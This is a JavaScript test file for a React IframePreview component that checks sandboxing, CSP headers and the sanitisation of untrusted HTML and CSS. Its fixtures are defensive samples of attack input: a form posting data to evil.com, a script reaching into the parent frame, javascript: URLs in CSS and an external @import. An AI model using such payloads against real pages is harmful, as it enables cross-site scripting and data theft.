import { render, screen, waitFor } from '@testing-library/react';
import { IframePreview } from '../IframePreview';

/**
 * Comprehensive security tests for IframePreview component
 * Tests cross-frame communication security and iframe isolation
 */
describe('IframePreview Security Tests', () => {
  const mockHtmlContent = '<div class="test-content">Test HTML Content</div>';
  const mockCssContent = '.test-content { color: red; background: blue; }';

  // Mock for safer testing environment
  beforeEach(() => {
    // Mock console methods to avoid test noise
    jest.spyOn(console, 'warn').mockImplementation(() => {});
    jest.spyOn(console, 'error').mockImplementation(() => {});
    
    // Mock iframe element for testing
    global.HTMLIFrameElement = class MockHTMLIFrameElement extends HTMLElement {
      constructor() {
        super();
        this.contentDocument = null;
        this.contentWindow = null;
        this._src = '';
      }

      set src(value) {
        this._src = value;
        // Simulate async loading
        setTimeout(() => {
          const loadEvent = new Event('load');
          this.dispatchEvent(loadEvent);
        }, 0);
      }

      get src() {
        return this._src;
      }
    };
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('Sandbox Attribute Security', () => {
    test('applies minimal sandbox permissions', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const sandboxValue = iframe.getAttribute('sandbox');
      
      // Should only allow same-origin, no scripts, forms, or navigation
      expect(sandboxValue).toBe('allow-same-origin');
      expect(sandboxValue).not.toContain('allow-scripts');
      expect(sandboxValue).not.toContain('allow-forms');
      expect(sandboxValue).not.toContain('allow-navigation');
      expect(sandboxValue).not.toContain('allow-popups');
      expect(sandboxValue).not.toContain('allow-top-navigation');
    });

    test('prevents script execution in iframe', () => {
      const htmlWithScript = `
        <div>Safe content</div>
        <script>
          window.parent.postMessage('malicious-message', '*');
          document.body.innerHTML = '<h1>XSS Attack</h1>';
        </script>
      `;
      
      render(<IframePreview htmlContent={htmlWithScript} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      const decodedSrc = decodeURIComponent(src);
      
      // Script should be sanitized out
      expect(decodedSrc).toContain('Safe content');
      expect(decodedSrc).not.toContain('<script>');
      expect(decodedSrc).not.toContain('window.parent.postMessage');
    });

    test('prevents form submission outside iframe', () => {
      const htmlWithForm = `
        <form action="https://evil.com/steal-data" method="POST">
          <input type="hidden" name="data" value="sensitive">
          <button type="submit">Submit</button>
        </form>
      `;
      
      render(<IframePreview htmlContent={htmlWithForm} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const sandboxValue = iframe.getAttribute('sandbox');
      
      // Forms should be blocked by sandbox
      expect(sandboxValue).not.toContain('allow-forms');
    });

    test('prevents navigation to external URLs', () => {
      const htmlWithNavigation = `
        <a href="https://malicious.com">Click me</a>
        <button onclick="window.location.href='https://evil.com'">Navigate</button>
      `;
      
      render(<IframePreview htmlContent={htmlWithNavigation} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const sandboxValue = iframe.getAttribute('sandbox');
      const src = iframe.getAttribute('src');
      const decodedSrc = decodeURIComponent(src);
      
      // Navigation should be blocked by sandbox
      expect(sandboxValue).not.toContain('allow-navigation');
      expect(sandboxValue).not.toContain('allow-top-navigation');
      
      // Event handlers should be sanitized
      expect(decodedSrc).not.toContain('onclick=');
    });
  });

  describe('Content Security Policy', () => {
    test('includes proper CSP headers in iframe content', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      const decodedContent = decodeURIComponent(src);
      
      expect(decodedContent).toContain('Content-Security-Policy');
      expect(decodedContent).toContain("default-src 'none'");
      expect(decodedContent).toContain("style-src 'unsafe-inline'");
    });

    test('blocks external resource loading via CSP', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      const decodedContent = decodeURIComponent(src);
      
      // Should not allow loading external scripts or objects
      expect(decodedContent).toContain("default-src 'none'");
      expect(decodedContent).not.toContain("script-src");
      expect(decodedContent).not.toContain("object-src");
    });

    test('includes X-Content-Type-Options and X-Frame-Options headers', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      const decodedContent = decodeURIComponent(src);
      
      expect(decodedContent).toContain('X-Content-Type-Options');
      expect(decodedContent).toContain('nosniff');
      expect(decodedContent).toContain('X-Frame-Options');
      expect(decodedContent).toContain('SAMEORIGIN');
    });
  });

  describe('Data URL Security', () => {
    test('uses data URL for secure content injection', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      
      expect(src).toStartWith('data:text/html;charset=utf-8,');
      expect(src).not.toStartWith('http://');
      expect(src).not.toStartWith('https://');
      expect(src).not.toStartWith('javascript:');
    });

    test('properly encodes content in data URL', () => {
      const htmlWithSpecialChars = '<div>Special chars: &amp; &lt; &gt; " \' %</div>';
      
      render(<IframePreview htmlContent={htmlWithSpecialChars} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      
      expect(src).toStartWith('data:text/html;charset=utf-8,');
      
      const decodedContent = decodeURIComponent(src.replace('data:text/html;charset=utf-8,', ''));
      expect(decodedContent).toContain('Special chars');
      expect(decodedContent).toContain('&amp;');
    });

    test('handles large content without breaking data URL', () => {
      const largeHtml = '<div>' + 'Large content '.repeat(100) + '</div>';
      
      render(<IframePreview htmlContent={largeHtml} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      
      expect(src).toStartWith('data:text/html;charset=utf-8,');
      expect(decodeURIComponent(src)).toContain('Large content');
    });
  });

  describe('Cross-Frame Communication Prevention', () => {
    test('prevents postMessage from iframe to parent', () => {
      // This is implicitly tested by the sandbox attributes
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const sandboxValue = iframe.getAttribute('sandbox');
      
      // Scripts are disabled, so postMessage cannot be used
      expect(sandboxValue).not.toContain('allow-scripts');
    });

    test('isolates iframe window object from parent', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      
      // Iframe should be isolated - contentWindow should not be accessible
      // This is enforced by the sandbox and same-origin policy
      expect(iframe.getAttribute('sandbox')).toBeTruthy();
    });

    test('prevents access to parent document from iframe', () => {
      const htmlWithParentAccess = `
        <div>Content</div>
        <script>
          try {
            parent.document.body.style.background = 'red';
            parent.alert('Access granted');
          } catch (e) {
            console.log('Access denied');
          }
        </script>
      `;
      
      render(<IframePreview htmlContent={htmlWithParentAccess} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      const decodedContent = decodeURIComponent(src);
      
      // Scripts should be removed during sanitization
      expect(decodedContent).not.toContain('<script>');
      expect(decodedContent).not.toContain('parent.document');
    });
  });

  describe('CSS Injection Security', () => {
    test('isolates CSS within iframe scope', () => {
      const aggressiveCss = `
        * { background: red !important; color: white !important; }
        body { transform: rotate(180deg) !important; }
        html { display: none !important; }
      `;
      
      render(<IframePreview htmlContent={mockHtmlContent} cssContent={aggressiveCss} />);
      
      // Parent document should not be affected
      const parentBody = document.body;
      const computedStyle = window.getComputedStyle(parentBody);
      
      expect(computedStyle.backgroundColor).not.toBe('red');
      expect(computedStyle.color).not.toBe('white');
      expect(computedStyle.display).not.toBe('none');
    });

    test('prevents CSS from breaking out of iframe', () => {
      const breakoutCss = `
        iframe { display: none !important; }
        body { background: url('javascript:alert("xss")') !important; }
        * { behavior: url('malicious.htc') !important; }
      `;
      
      render(<IframePreview htmlContent={mockHtmlContent} cssContent={breakoutCss} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      expect(iframe).toBeVisible();
      
      const src = iframe.getAttribute('src');
      const decodedContent = decodeURIComponent(src);
      
      // CSS sanitization should remove dangerous content
      expect(decodedContent).not.toContain('javascript:alert');
      expect(decodedContent).not.toContain('behavior:');
    });

    test('handles CSS with external imports safely', () => {
      const cssWithImports = `
        @import url('https://evil.com/malicious.css');
        @import 'local-file.css';
        .safe { color: blue; }
      `;
      
      render(<IframePreview htmlContent={mockHtmlContent} cssContent={cssWithImports} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      const src = iframe.getAttribute('src');
      const decodedContent = decodeURIComponent(src);
      
      // Imports should be stripped by CSP and sanitization
      expect(decodedContent).not.toContain('@import');
      expect(decodedContent).toContain('.safe { color: blue; }');
    });
  });

  describe('Referrer Policy Security', () => {
    test('sets no-referrer policy to prevent information leakage', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      expect(iframe).toHaveAttribute('referrerPolicy', 'no-referrer');
    });
  });

  describe('Performance and Resource Security', () => {
    test('implements lazy loading for performance', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      expect(iframe).toHaveAttribute('loading', 'lazy');
    });

    test('prevents resource exhaustion with large content', () => {
      const massiveHtml = '<div>' + 'x'.repeat(10000) + '</div>';
      const massiveCss = '.test { color: red; }'.repeat(1000);
      
      const startTime = performance.now();
      render(<IframePreview htmlContent={massiveHtml} cssContent={massiveCss} />);
      const endTime = performance.now();
      
      expect(endTime - startTime).toBeLessThan(1000); // Should render quickly
      
      const iframe = screen.getByTestId('preview-iframe');
      expect(iframe).toBeInTheDocument();
    });
  });

  describe('Error Boundary Security', () => {
    test('handles malformed HTML gracefully', () => {
      const malformedHtml = '<div><p><span>Unclosed tags';
      
      expect(() => {
        render(<IframePreview htmlContent={malformedHtml} />);
      }).not.toThrow();
      
      const iframe = screen.getByTestId('preview-iframe');
      expect(iframe).toBeInTheDocument();
    });

    test('handles malformed CSS gracefully', () => {
      const malformedCss = '.class { color: ; background } invalid css';
      
      expect(() => {
        render(<IframePreview htmlContent={mockHtmlContent} cssContent={malformedCss} />);
      }).not.toThrow();
      
      const iframe = screen.getByTestId('preview-iframe');
      expect(iframe).toBeInTheDocument();
    });

    test('provides fallback content for iframe failures', () => {
      render(<IframePreview htmlContent={mockHtmlContent} />);
      
      const iframe = screen.getByTestId('preview-iframe');
      expect(iframe).toHaveAttribute('title', expect.stringContaining('Preview'));
    });
  });

  describe('Memory Management', () => {
    test('cleans up properly when component unmounts', () => {
      const { unmount } = render(
        <IframePreview htmlContent={mockHtmlContent} cssContent={mockCssContent} />
      );
      
      // Should unmount without memory leaks or errors
      expect(() => unmount()).not.toThrow();
    });

    test('handles rapid re-renders without memory issues', () => {
      const { rerender } = render(
        <IframePreview htmlContent={mockHtmlContent} cssContent="" />
      );
      
      // Simulate rapid updates
      for (let i = 0; i < 20; i++) {
        rerender(
          <IframePreview 
            htmlContent={mockHtmlContent} 
            cssContent={`.dynamic-${i} { color: hsl(${i * 18}, 70%, 50%); }`} 
          />
        );
      }
      
      const iframe = screen.getByTestId('preview-iframe');
      expect(iframe).toBeInTheDocument();
    });
  });
});